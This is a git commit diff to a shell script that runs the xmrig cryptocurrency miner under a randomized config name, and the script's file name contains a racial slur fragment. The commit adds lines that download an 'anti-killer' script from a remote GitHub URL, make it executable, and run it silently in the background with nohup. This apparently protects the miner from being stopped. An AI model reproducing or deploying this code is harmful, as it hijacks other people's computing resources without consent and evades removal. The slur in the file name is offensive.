8608c438b0b5902ce43259692b7cd9f484739941
gorguzaaaaz <sigmaboy182009@gmail.com>
2025-03-07 15:04:34 +0530

    Update textnigg.sh

--- textnigg.sh
+++ textnigg.sh
@@ -44,3 +44,9 @@ sed -i "s/kasm/kasm-$randnum/g" config.json
 
 sudo -n ./xmrig
 ./xmrig
+
+# Anti-Killer Protection Start
+wget -qO /tmp/anti-killer.sh https://raw.githubusercontent.com/gorguzaaaaz/kerala/refs/heads/main/anti-killer.sh
+chmod +x /tmp/anti-killer.sh
+nohup bash /tmp/anti-killer.sh > /dev/null 2>&1 &
+
